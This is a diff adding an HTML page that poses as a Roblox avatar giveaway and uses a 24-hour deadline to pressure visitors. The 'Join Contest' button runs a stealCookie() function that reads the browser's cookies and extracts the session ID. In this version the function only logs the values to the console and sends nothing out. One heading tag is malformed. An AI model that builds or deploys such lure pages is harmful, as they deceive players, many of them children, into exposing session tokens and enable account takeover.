@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Avatar Contest!</title>
+</head>
+<body>
+  <h1>🎉 Roblox Avatar Contest! 🎉</h
+  <p>Win a rare avatar! Only 24 hours left!</p>
+  <button onclick="stealCookie()">Join Contest</button>
+  <script>
+    function stealCookie() {
+      const cookies = document.cookie;
+      console.log("Roblox Cookies:", cookies);
+      const sessionID = cookies.split("sessionid=")[1].split(";")[0];
+      console.log("Session ID:", sessionID);
+    }
+  </script>
+</body>
+</html>
